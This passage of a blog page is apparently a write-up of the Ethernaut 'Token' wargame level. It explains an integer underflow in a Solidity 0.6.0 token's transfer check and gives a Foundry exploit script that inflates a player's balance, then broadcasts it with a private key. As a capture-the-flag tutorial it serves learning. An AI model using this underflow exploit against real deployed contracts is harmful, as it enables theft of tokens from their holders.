+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Token</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint256</span><span class=p>)</span> <span class=n>balances</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>totalSupply</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>_initialSupply</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>totalSupply</span> <span class=o>=</span> <span class=n>_initialSupply</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>_value</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-</span> <span class=n>_value</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>_value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>balances</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>+=</span> <span class=n>_value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>_owner</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span> <span class=nb>balance</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>balances</span><span class=p>[</span><span class=n>_owner</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>first lets check the 20 tokens we have using <code>cast</code>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://lanaceryasser.github.io/ethernaut/token/balance-check.png data-srcset="https://lanaceryasser.github.io/ethernaut/token/balance-check.png, https://lanaceryasser.github.io/ethernaut/token/balance-check.png 1.5x, https://lanaceryasser.github.io/ethernaut/token/balance-check.png 2x" data-sizes=auto alt=https://lanaceryasser.github.io/ethernaut/token/balance-check.png title=https://lanaceryasser.github.io/ethernaut/token/balance-check.png></p><p>what this command does is simply send an <code>eth_call</code> which allows us to execute the view function locally in the node without spending any gas</p><p>now the description tells us to check <code>odometer</code> — the special thing about it is that it resets after reaching a certain max number, similar to overflows</p><p>in solidity versions before 0.8.0, overflow/underflow did happen and developers had to add custom checks or use libraries like safemath; in versions 0.8.x new opcodes have been added to arithmetic operations to prevent this</p><p>returning to the contract, the version is 0.6.0 which is vulnerable to underflow:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span> <span class=n>_to</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>_value</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-</span> <span class=n>_value</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>-=</span> <span class=n>_value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>balances</span><span class=p>[</span><span class=n>_to</span><span class=p>]</span> <span class=o>+=</span> <span class=n>_value</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>the only check is <code>require(balances[msg.sender] - _value >= 0)</code> and the underflow applies here: if a contract has balance 0 and calls this with <code>_value = 100</code>, <code>balances[msg.sender] - _value</code> will be equal to <code>type(uint256).max - 99</code> which is bigger than 0, so we bypass the require and get tokens without losing any</p><p>here is the solver script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
+</span></span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Script.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/console.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>attack</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>Token</span> <span class=n>token</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=n>player</span> <span class=o>=</span> <span class=mh>0x284Cd6B2b7D4dC8a754c8fC34858529db5039eBb</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>(</span><span class=n>Token</span> <span class=n>_token</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>token</span> <span class=o>=</span> <span class=n>_token</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>token</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>player</span><span class=p>,</span> <span class=mi>6767676747</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>console</span><span class=p>.</span><span class=n>log</span><span class=p>(</span><span class=n>token</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=n>player</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Solver</span> <span class=k>is</span> <span class=n>Script</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>Token</span> <span class=n>instance</span> <span class=o>=</span> <span class=n>Token</span><span class=p>(</span><span class=mh>0xD71EA4b9951B1861115Ce3c5fdEcE2440b77d21B</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>run</span><span class=p>()</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>     <span class=n>vm</span><span class=p>.</span><span class=n>startBroadcast</span><span class=p>(</span><span class=n>vm</span><span class=p>.</span><span class=n>envUint</span><span class=p>(</span><span class=s>&#34;PRIVATE_KEY&#34;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>     <span class=n>attack</span> <span class=n>p</span> <span class=o>=</span> <span class=k>new</span> <span class=n>attack</span><span class=p>(</span><span class=n>instance</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>executing it locally:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://lanaceryasser.github.io/ethernaut/token/exploit-result.png data-srcset="https://lanaceryasser.github.io/ethernaut/token/exploit-result.png, https://lanaceryasser.github.io/ethernaut/token/exploit-result.png 1.5x, https://lanaceryasser.github.io/ethernaut/token/exploit-result.png 2x" data-sizes=auto alt=https://lanaceryasser.github.io/ethernaut/token/exploit-result.png title=https://lanaceryasser.github.io/ethernaut/token/exploit-result.png></p><p>the exploit works fine, we just add the <code>--broadcast</code> flag to execute it remotely and gg the challenge is solved</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-tag><span><a href=/tags/ethernaut/>Ethernaut</a>
+</span><span><a href=/tags/solidity/>Solidity</a>
+</span><span><a href=/tags/underflow/>Underflow</a>
+</span><span><a href=/tags/overflow/>Overflow</a>
+</span><span><a href=/tags/evm/>Evm</a></span></div><div class=post-info-line><div class=post-info-mod><span>Updated on 2026-01-07</span></div><div class=post-info-mod></div></div><div class=post-info-share><span><a href=# onclick=return!1 title="Share on Facebook" data-sharer=facebook data-url=https://lanaceryasser.github.io/ethernaut/token/ data-hashtag=ethernaut><i class="fa-brands fa-facebook-square fa-fw"></i></a><a href=# onclick=return!1 title="Share on Linkedin" data-sharer=linkedin data-url=https://lanaceryasser.github.io/ethernaut/token/><i class="fa-brands fa-linkedin fa-fw"></i></a></span></div></div><div class=related-content><h3 class=related-title>See Also</h3><div class=related-posts><a class=related-post href=/ethernaut/delegation/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Delegation</span></div></a><a class=related-post href=/posts/ethernaut/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Ethernaut</span></div></a><a class=related-post href=/ethernaut/force/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Force</span></div></a><a class=related-post href=/ethernaut/gatekeeper-one/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Gatekeeper One</span></div></a><a class=related-post href=/ethernaut/magic-number/><div class=related-post-image-placeholder><i class="fa-solid fa-newspaper"></i></div><div class=related-post-content><span class=related-post-title>Magic Number</span></div></a></div></div><div class=post-nav><a href=/ethernaut/vault/ class=prev rel=prev title=Vault><i class="fa-solid fa-angle-left fa-fw"></i>Previous Post</a>
+<a href=/ethernaut/magic-number/ class=next rel=next title="Magic Number">Next Post<i class="fa-solid fa-angle-right fa-fw"></i></a></div></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.164.0 (ce2470e7012b5ab5fc4e10ebe4027e9f8d9e00dc)">Hugo</a> | Theme - <a href=https://github.com/khusika/FeelIt target=_blank rel="noopener noreffer" title="FeelIt 1.0.3"><i class="fa-solid fa-hand-holding-heart fa-fw"></i> FeelIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw"></i><span itemprop=copyrightYear>2024 - 2026</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/>Koyphshi</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fa-solid fa-chevron-up fa-fw"></i></a></div><link rel=stylesheet href=/lib/fontawesome-free/all.min.css><link rel=stylesheet href=/lib/animate/animate.min.css><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=stylesheet href=/lib/katex/copy-tex.min.css><link rel=stylesheet href=/css/custom.css><script src=/lib/autocomplete/autocomplete.min.js></script><script src=/lib/lunr/lunr.min.js></script><script src=/lib/lazysizes/lazysizes.min.js></script><script src=/lib/clipboard/clipboard.min.js></script><script src=/lib/sharer/sharer.min.js></script><script src=/lib/katex/katex.min.js></script><script src=/lib/katex/auto-render.min.js></script><script src=/lib/katex/copy-tex.min.js></script><script src=/lib/katex/mhchem.min.js></script><script>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:50},comment:{},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script src=/js/theme.min.js></script></body></html>
